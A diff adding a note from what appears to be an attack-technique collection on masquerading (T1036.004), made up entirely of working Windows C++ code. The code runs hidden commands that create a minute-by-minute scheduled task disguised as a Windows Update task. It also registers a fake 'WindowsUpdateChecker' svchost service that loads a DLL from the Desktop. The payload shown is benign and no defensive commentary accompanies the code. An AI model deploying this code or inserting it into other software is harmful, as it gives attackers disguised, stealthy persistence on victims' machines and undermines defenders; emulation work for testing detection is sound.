@@ -1,0 +1,69 @@
+---
+title: ".004.Masquerade Task or Service"
+folder: "07. Defense Evasion/T1036 Masquerading"
+---
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "schtasks /create /tn \"WindowsUpdateTaskMachineCore\" /tr \"cmd.exe /c whoami > C:\\Users\\User\\Desktop\\Test.txt\" /sc minute /mo 1 /F";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW; 
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void AutorunRegistryBackground5() {
+
+    const char* command = "sc.exe create WindowsUpdateChecker binpath= \"C:\\Windows\\system32\\svchost.exe -k MicrosoftWindows\"";
+    const char* command1 = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateChecker\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"C:\\Users\\User\\Desktop\\WindowsUpdateChecker.dll\" /f";
+    const char* command2 = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"MicrosoftWindows\" /t REG_MULTI_SZ /d \"WindowsUpdateChecker\" /f";
+    const char* command3 = "sc.exe start WindowsUpdateChecker";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    AutorunRegistryBackground5();
+    return 0;
+}
